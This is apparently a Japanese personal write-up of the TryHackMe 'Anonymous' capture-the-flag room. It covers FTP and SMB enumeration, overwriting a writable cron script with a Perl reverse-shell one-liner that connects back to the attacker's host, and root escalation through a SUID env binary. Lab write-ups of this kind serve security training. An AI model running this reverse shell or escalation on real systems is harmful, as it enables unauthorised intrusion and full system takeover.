# Anonymous CTF

https://tryhackme.com/room/anonymous

## Enumeration

```shell
TARGET=10.201.59.31
sudo bash -c "echo $TARGET   anonymous.thm >> /etc/hosts"
```

### ポートスキャン

```sh
root@ip-10-201-47-168:~# nmap -sS -p- $TARGET

PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

```shell
root@ip-10-201-47-168:~# sudo nmap -sS -sV -p21,22,139,445 $TARGET

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

## FTP

anonymousでログイン可能

```sh
ftp> ls -al
229 Entering Extended Passive Mode (|||31827|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1075 Sep 26 23:29 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

FTPで見えているのは、/var/ftp の中。現状、tmp_files=0 なので何も実行していない。

```sh
$ cat clean.sh  
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

```sh
$ cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

```sh
$ cat to_do.txt                             
I really need to disable the anonymous login...it's really not safe
```

## SMB

pics ディレクトリをリスト可能。

```sh
$ enum4linux -S $TARGET

//10.201.59.31/print$   Mapping: DENIED Listing: N/A Writing: N/A
//10.201.59.31/pics     Mapping: OK Listing: OK Writing: N/A
//10.201.59.31/IPC$     Mapping: N/A Listing: N/A Writing: N/A
```

jpgが2ファイル。コーギーが１匹、コーギーが３匹。

```sh
$ smbclient //$TARGET/pics -U ""             
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> l
  .                                   D        0  Sun May 17 20:11:34 2020
  ..                                  D        0  Thu May 14 10:59:10 2020
  corgo2.jpg                          N    42663  Tue May 12 09:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 09:43:42 2020

                20508240 blocks of size 1024. 13306824 blocks available
```

file

```sh
$ file ./corgo2.jpg 
./corgo2.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 800x533, components 3

$ file ./puppos.jpeg 
./puppos.jpeg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=19, height=3744, bps=242, PhotometricInterpretation=RGB, description=Three Pembroke Welsh Corgis side by side outdoors. Approved by Denise Flaim September 2018 and Susan Sprung., manufacturer=Canon, model=Canon EOS 5D Mark II, orientation=upper-left, width=5616], progressive, precision 8, 600x400, components 3
```

exiftool

```sh
$ exiftool ./puppos.jpeg

Caption-Abstract                : Three Pembroke Welsh Corgis side by side outdoors. Approved by Denise Flaim September 2018 and Susan Sprung..Adobe Stock #118102236
Object Name                     : Three dogs of welsh corgi pembroke breed with white and red coat
Description                     : Three Pembroke Welsh Corgis side by side outdoors. Approved by Denise Flaim September 2018 and Susan Sprung..Adobe Stock #118102236
Rights                          : Tatyana Panova.www.tpanova.ru
Subject                         : animal, dog, pembroke, corgi, welsh, cute, canine, happy, breed, portrait, pedigree, grass, posing, outdoor, happiness, nature, friend, green, funny, summer, beautiful, looking, color, purebred, adorable, playing, brown, smile, smiling, fun, standing, small, friendly, cheerful, young, view, background, park, life, little, walk, tongue, enjoy, pet, ears, pretty, domestic, lovely, horizontal, sun, grass, park, portrait
Title                           : Three dogs of welsh corgi pembroke breed with white and red coat with tongue, sitting outdoors on green grass on summer sunny day
```

たぶん何かあると思うが、分からない。

## エクスプロイト

単純に、clean.sh をFTPで置き換える。

```sh
perl -e 'use Socket;$i="10.11.146.32";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

シェル取得成功。

```sh
$ nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.59.31] 56760
sh: 0: can't access tty; job control turned off
$ id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

## 権限昇格

### CVE-2021-3156

make が使えないので断念。

### lxd 権限昇格

ストレージPoolが無いためエラー。断念。

```sh
namelessone@anonymous:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
Error: No storage pool found. Please create a new storage pool
```

### SUID

env に SUIDが付いていた。

```sh
namelessone@anonymous:~$ find / -perm -u=s -type f -ls 2>/dev/null
...
   918992     36 -rwsr-xr-x   1 root     root               35000 Jan 18  2018 /usr/bin/env
```

```sh
namelessone@anonymous:~$ env /bin/sh -p
# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

## 振り返り

- 中級にしては簡単だった。
- 最初にSUIDを見たとき、envに気づかなかった。何もないと思っても、出力を必ずChatGPTにダブルチェックしてもらうよう手順を変更する。
